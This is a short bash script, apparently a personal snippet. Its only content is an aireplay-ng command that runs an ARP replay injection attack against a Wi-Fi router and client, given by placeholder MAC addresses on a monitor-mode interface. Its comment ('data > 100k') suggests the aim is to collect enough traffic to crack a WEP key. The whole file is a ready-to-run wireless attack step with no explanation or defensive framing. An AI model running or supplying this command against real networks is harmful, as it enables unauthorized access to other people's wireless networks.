#!/bin/bash
#data > 100k
#-3 = arp reply ; -b router ; -h router client
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h FF:EE:DD:CC:BB:AA wlan1mon;
